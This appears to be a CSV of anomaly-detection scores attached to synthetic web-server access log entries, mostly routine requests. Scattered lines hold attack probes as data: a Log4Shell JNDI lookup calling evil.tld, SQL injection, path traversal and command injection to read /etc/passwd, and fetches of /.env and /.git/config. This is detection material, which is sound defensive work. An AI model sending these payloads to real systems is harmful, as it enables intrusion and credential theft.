score_content,score_session,score_fused,score_fused_norm,line
102.98487091064453,,102.98487091064453,102.98487091064453,{"remote_addr": "248.65.188.195", "time_local": "11/Jan/2025:09:00:21 -0700", "request": "TRACE /contact HTTP/2", "status": 200, "body_bytes_sent": 4901, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
93.90540313720703,,93.90540313720703,93.90540313720703,{"remote_addr": "194.136.81.21", "time_local": "11/Jan/2025:09:00:22 -0700", "request": "OPTIONS /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 5647, "http_referer": "https://twitter.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
2.905193567276001,,2.905193567276001,2.905193567276001,{"remote_addr": "173.33.104.27", "time_local": "11/Jan/2025:09:00:23 -0700", "request": "GET /assets/app.js HTTP/2", "status": 302, "body_bytes_sent": 709, "http_referer": "https://www.google.com/", "http_user_agent": "nikto/2.5.0"}
68.5343246459961,,68.5343246459961,68.5343246459961,{"remote_addr": "73.73.102.83", "time_local": "11/Jan/2025:09:00:23 -0700", "request": "HEAD /search?q=camera HTTP/2", "status": 200, "body_bytes_sent": 5703, "http_referer": "https://www.google.com/", "http_user_agent": "nikto/2.5.0"}
30147.599609375,,30147.599609375,30147.599609375,{"remote_addr": "251.132.164.48", "time_local": "11/Jan/2025:09:00:24 -0700", "request": "GET /search?q=ssd HTTP/2", "status": 403, "body_bytes_sent": 373, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
26.6175594329834,,26.6175594329834,26.6175594329834,{"remote_addr": "232.148.156.53", "time_local": "11/Jan/2025:09:00:24 -0700", "request": "POST /search?q=laptop HTTP/2", "status": 200, "body_bytes_sent": 10691, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
48.8409309387207,,48.8409309387207,48.8409309387207,{"remote_addr": "107.232.239.212", "time_local": "11/Jan/2025:09:00:25 -0700", "request": "DELETE /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 7850, "http_referer": "https://www.google.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
48.861515045166016,,48.861515045166016,48.861515045166016,{"remote_addr": "246.211.245.94", "time_local": "11/Jan/2025:09:00:26 -0700", "request": "DELETE /search?q=camera HTTP/2", "status": 200, "body_bytes_sent": 7551, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
93.96017456054688,,93.96017456054688,93.96017456054688,{"remote_addr": "131.191.13.248", "time_local": "11/Jan/2025:09:00:26 -0700", "request": "OPTIONS /search?q=camera HTTP/2", "status": 200, "body_bytes_sent": 15117, "http_referer": "https://www.google.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
71.91973876953125,,71.91973876953125,71.91973876953125,{"remote_addr": "3.19.247.160", "time_local": "11/Jan/2025:09:00:26 -0700", "request": "OPTIONS /profile HTTP/2", "status": 200, "body_bytes_sent": 14930, "http_referer": "https://example.com/", "http_user_agent": "nikto/2.5.0"}
49.23126220703125,,49.23126220703125,49.23126220703125,{"remote_addr": "159.146.220.148", "time_local": "11/Jan/2025:09:00:27 -0700", "request": "HEAD /about HTTP/2", "status": 304, "body_bytes_sent": 405, "http_referer": "-", "http_user_agent": "python-requests/2.31.0"}
30148.388671875,,30148.388671875,30148.388671875,{"remote_addr": "195.74.150.80", "time_local": "11/Jan/2025:09:00:28 -0700", "request": "DELETE /cgi-bin/test.cgi HTTP/2", "status": 403, "body_bytes_sent": 1274, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
0.2571238577365875,,0.2571238577365875,0.2571238577365875,{"remote_addr": "221.94.13.196", "time_local": "11/Jan/2025:09:00:29 -0700", "request": "GET /assets/app.css HTTP/2", "status": 200, "body_bytes_sent": 8039, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
68.55611419677734,,68.55611419677734,68.55611419677734,{"remote_addr": "110.202.137.45", "time_local": "11/Jan/2025:09:00:30 -0700", "request": "HEAD /api/user?id=1;DROP TABLE users HTTP/2", "status": 200, "body_bytes_sent": 7324, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
30173.1015625,,30173.1015625,30173.1015625,{"remote_addr": "135.22.221.189", "time_local": "11/Jan/2025:09:00:30 -0700", "request": "DELETE /api/product?id=123 HTTP/2", "status": 429, "body_bytes_sent": 21, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
26.710832595825195,,26.710832595825195,26.710832595825195,{"remote_addr": "223.128.105.15", "time_local": "11/Jan/2025:09:00:31 -0700", "request": "POST /search?q=ssd HTTP/2", "status": 200, "body_bytes_sent": 16337, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
11036.5869140625,,11036.5869140625,11036.5869140625,{"remote_addr": "159.164.148.146", "time_local": "11/Jan/2025:09:00:32 -0700", "request": "GET /.git/config HTTP/2", "status": 502, "body_bytes_sent": 1311, "http_referer": "https://twitter.com/", "http_user_agent": "python-requests/2.31.0"}
48.905208587646484,,48.905208587646484,48.905208587646484,{"remote_addr": "48.180.192.247", "time_local": "11/Jan/2025:09:00:33 -0700", "request": "DELETE /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 15683, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
74.59555053710938,,74.59555053710938,74.59555053710938,{"remote_addr": "31.76.45.245", "time_local": "11/Jan/2025:09:00:34 -0700", "request": "OPTIONS /login HTTP/2", "status": 302, "body_bytes_sent": 14667, "http_referer": "https://www.google.com/", "http_user_agent": "nikto/2.5.0"}
0.5804252028465271,,0.5804252028465271,0.5804252028465271,{"remote_addr": "178.7.254.133", "time_local": "11/Jan/2025:09:00:34 -0700", "request": "GET /.env HTTP/2", "status": 200, "body_bytes_sent": 7703, "http_referer": "-", "http_user_agent": "nikto/2.5.0"}
71.84521484375,,71.84521484375,71.84521484375,{"remote_addr": "167.222.67.42", "time_local": "11/Jan/2025:09:00:35 -0700", "request": "OPTIONS /dashboard HTTP/2", "status": 200, "body_bytes_sent": 12828, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
0.2607578933238983,,0.2607578933238983,0.2607578933238983,{"remote_addr": "152.60.219.133", "time_local": "11/Jan/2025:09:00:35 -0700", "request": "GET /assets/app.js HTTP/2", "status": 200, "body_bytes_sent": 3031, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
2.0133581161499023,,2.0133581161499023,2.0133581161499023,{"remote_addr": "3.164.104.196", "time_local": "11/Jan/2025:09:00:36 -0700", "request": "GET /about HTTP/2", "status": 200, "body_bytes_sent": 2081, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
46.536251068115234,,46.536251068115234,46.536251068115234,{"remote_addr": "236.174.50.244", "time_local": "11/Jan/2025:09:00:37 -0700", "request": "HEAD /logout HTTP/2", "status": 200, "body_bytes_sent": 7987, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "dirb/2.22"}
68.53921508789062,,68.53921508789062,68.53921508789062,{"remote_addr": "1.69.139.109", "time_local": "11/Jan/2025:09:00:37 -0700", "request": "HEAD /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 2536, "http_referer": "https://example.com/", "http_user_agent": "nikto/2.5.0"}
2.921623945236206,,2.921623945236206,2.921623945236206,{"remote_addr": "192.28.201.90", "time_local": "11/Jan/2025:09:00:39 -0700", "request": "POST /index.html HTTP/2", "status": 201, "body_bytes_sent": 1520, "http_referer": "https://www.google.com/", "http_user_agent": "nikto/2.5.0"}
0.23880602419376373,,0.23880602419376373,0.23880602419376373,{"remote_addr": "241.134.154.158", "time_local": "11/Jan/2025:09:00:40 -0700", "request": "GET /assets/app.css HTTP/2", "status": 200, "body_bytes_sent": 3797, "http_referer": "https://example.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
12.871203422546387,,12.871203422546387,12.871203422546387,{"remote_addr": "54.70.233.131", "time_local": "11/Jan/2025:09:00:41 -0700", "request": "PUT /login HTTP/2", "status": 200, "body_bytes_sent": 2549, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
0.23450292646884918,,0.23450292646884918,0.23450292646884918,{"remote_addr": "48.34.101.220", "time_local": "11/Jan/2025:09:00:42 -0700", "request": "GET /assets/app.css HTTP/2", "status": 200, "body_bytes_sent": 1439, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
30125.673828125,,30125.673828125,30125.673828125,{"remote_addr": "129.58.100.212", "time_local": "11/Jan/2025:09:00:42 -0700", "request": "GET /dashboard HTTP/2", "status": 403, "body_bytes_sent": 1002, "http_referer": "-", "http_user_agent": "python-requests/2.31.0"}
1.9754619598388672,,1.9754619598388672,1.9754619598388672,{"remote_addr": "4.239.7.73", "time_local": "11/Jan/2025:09:00:43 -0700", "request": "GET /logout HTTP/2", "status": 200, "body_bytes_sent": 1604, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
44.796661376953125,,44.796661376953125,44.796661376953125,{"remote_addr": "127.12.132.203", "time_local": "11/Jan/2025:09:00:43 -0700", "request": "HEAD /../../etc/passwd HTTP/2", "status": 204, "body_bytes_sent": 16769, "http_referer": "-", "http_user_agent": "nikto/2.5.0"}
12.742938041687012,,12.742938041687012,12.742938041687012,{"remote_addr": "254.98.31.71", "time_local": "11/Jan/2025:09:00:44 -0700", "request": "PUT /phpmyadmin HTTP/2", "status": 200, "body_bytes_sent": 14907, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
94.00959777832031,,94.00959777832031,94.00959777832031,{"remote_addr": "193.233.89.23", "time_local": "11/Jan/2025:09:00:45 -0700", "request": "OPTIONS /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 200, "body_bytes_sent": 3867, "http_referer": "-", "http_user_agent": "nikto/2.5.0"}
30216.388671875,,30216.388671875,30216.388671875,{"remote_addr": "142.57.140.245", "time_local": "11/Jan/2025:09:00:46 -0700", "request": "OPTIONS /search?q=phone HTTP/2", "status": 403, "body_bytes_sent": 1380, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
30169.625,,30169.625,30169.625,{"remote_addr": "21.135.173.44", "time_local": "11/Jan/2025:09:00:47 -0700", "request": "HEAD /about HTTP/2", "status": 401, "body_bytes_sent": 123, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
30127.82421875,,30127.82421875,30127.82421875,{"remote_addr": "130.76.206.191", "time_local": "11/Jan/2025:09:00:48 -0700", "request": "POST /server-status HTTP/2", "status": 400, "body_bytes_sent": 1134, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "dirb/2.22"}
26.675256729125977,,26.675256729125977,26.675256729125977,{"remote_addr": "43.135.218.100", "time_local": "11/Jan/2025:09:00:48 -0700", "request": "GET /search?q=camera HTTP/2", "status": 304, "body_bytes_sent": 7749, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
30147.3984375,,30147.3984375,30147.3984375,{"remote_addr": "212.129.23.178", "time_local": "11/Jan/2025:09:00:49 -0700", "request": "GET /search?q=monitor HTTP/2", "status": 400, "body_bytes_sent": 250, "http_referer": "https://twitter.com/", "http_user_agent": "curl/7.85.0"}
74.44438934326172,,74.44438934326172,74.44438934326172,{"remote_addr": "183.125.176.42", "time_local": "11/Jan/2025:09:00:50 -0700", "request": "OPTIONS /api/products HTTP/2", "status": 302, "body_bytes_sent": 16715, "http_referer": "https://twitter.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
34.89628219604492,,34.89628219604492,34.89628219604492,{"remote_addr": "56.17.25.182", "time_local": "11/Jan/2025:09:00:50 -0700", "request": "PUT /search?q=laptop HTTP/2", "status": 200, "body_bytes_sent": 10325, "http_referer": "https://example.com/", "http_user_agent": "dirb/2.22"}
124.99761199951172,,124.99761199951172,124.99761199951172,{"remote_addr": "164.210.110.24", "time_local": "11/Jan/2025:09:00:51 -0700", "request": "TRACE /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/2", "status": 200, "body_bytes_sent": 15888, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
44.92680740356445,,44.92680740356445,44.92680740356445,{"remote_addr": "130.241.94.7", "time_local": "11/Jan/2025:09:00:51 -0700", "request": "HEAD /index.html HTTP/2", "status": 200, "body_bytes_sent": 7991, "http_referer": "https://www.google.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
11105.3837890625,,11105.3837890625,11105.3837890625,{"remote_addr": "208.29.197.239", "time_local": "11/Jan/2025:09:00:52 -0700", "request": "HEAD /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/2", "status": 503, "body_bytes_sent": 119, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
101.38268280029297,,101.38268280029297,101.38268280029297,{"remote_addr": "62.68.157.80", "time_local": "11/Jan/2025:09:00:53 -0700", "request": "TRACE /wp-login.php HTTP/2", "status": 200, "body_bytes_sent": 10011, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
30125.619140625,,30125.619140625,30125.619140625,{"remote_addr": "232.1.149.96", "time_local": "11/Jan/2025:09:00:54 -0700", "request": "GET /contact HTTP/2", "status": 400, "body_bytes_sent": 1327, "http_referer": "https://twitter.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
30225.6796875,,30225.6796875,30225.6796875,{"remote_addr": "103.7.151.168", "time_local": "11/Jan/2025:09:00:54 -0700", "request": "TRACE /logout HTTP/2", "status": 403, "body_bytes_sent": 560, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
0.6117061972618103,,0.6117061972618103,0.6117061972618103,{"remote_addr": "79.82.77.94", "time_local": "11/Jan/2025:09:00:56 -0700", "request": "GET /.env HTTP/2", "status": 200, "body_bytes_sent": 16526, "http_referer": "-", "http_user_agent": "nikto/2.5.0"}
24.100677490234375,,24.100677490234375,24.100677490234375,{"remote_addr": "37.126.156.64", "time_local": "11/Jan/2025:09:00:56 -0700", "request": "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 200, "body_bytes_sent": 5806, "http_referer": "-", "http_user_agent": "python-requests/2.31.0"}
2.0544354915618896,,2.0544354915618896,2.0544354915618896,{"remote_addr": "19.66.229.237", "time_local": "11/Jan/2025:09:00:57 -0700", "request": "GET /admin HTTP/2", "status": 200, "body_bytes_sent": 294, "http_referer": "-", "http_user_agent": "python-requests/2.31.0"}
34.81005096435547,,34.81005096435547,34.81005096435547,{"remote_addr": "141.238.71.215", "time_local": "11/Jan/2025:09:00:58 -0700", "request": "PUT /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/2", "status": 200, "body_bytes_sent": 5566, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
12.715767860412598,,12.715767860412598,12.715767860412598,{"remote_addr": "15.220.37.131", "time_local": "11/Jan/2025:09:00:59 -0700", "request": "PUT /api/products HTTP/2", "status": 204, "body_bytes_sent": 4429, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
11161.951171875,,11161.951171875,11161.951171875,{"remote_addr": "161.234.120.82", "time_local": "11/Jan/2025:09:00:59 -0700", "request": "TRACE /search?q=phone HTTP/2", "status": 500, "body_bytes_sent": 262, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
26.58668327331543,,26.58668327331543,26.58668327331543,{"remote_addr": "18.186.68.172", "time_local": "11/Jan/2025:09:00:59 -0700", "request": "POST /search?q=laptop HTTP/2", "status": 200, "body_bytes_sent": 3099, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
30151.201171875,,30151.201171875,30151.201171875,{"remote_addr": "229.232.94.121", "time_local": "11/Jan/2025:09:01:00 -0700", "request": "DELETE /logout HTTP/2", "status": 429, "body_bytes_sent": 597, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
7.254831314086914,,7.254831314086914,7.254831314086914,{"remote_addr": "130.249.42.223", "time_local": "11/Jan/2025:09:01:00 -0700", "request": "POST /login HTTP/2", "status": 304, "body_bytes_sent": 3048, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
11.06431770324707,,11.06431770324707,11.06431770324707,{"remote_addr": "127.189.170.139", "time_local": "11/Jan/2025:09:01:01 -0700", "request": "PUT /../../etc/passwd HTTP/2", "status": 204, "body_bytes_sent": 6233, "http_referer": "https://www.google.com/", "http_user_agent": "nikto/2.5.0"}
1.869268536567688,,1.869268536567688,1.869268536567688,{"remote_addr": "116.40.241.67", "time_local": "11/Jan/2025:09:01:02 -0700", "request": "GET /dashboard HTTP/2", "status": 201, "body_bytes_sent": 2471, "http_referer": "https://example.com/", "http_user_agent": "nikto/2.5.0"}
30226.087890625,,30226.087890625,30226.087890625,{"remote_addr": "161.192.103.111", "time_local": "11/Jan/2025:09:01:02 -0700", "request": "TRACE / HTTP/2", "status": 404, "body_bytes_sent": 76, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
7.240043640136719,,7.240043640136719,7.240043640136719,{"remote_addr": "213.32.43.176", "time_local": "11/Jan/2025:09:01:03 -0700", "request": "POST /login HTTP/2", "status": 301, "body_bytes_sent": 15437, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
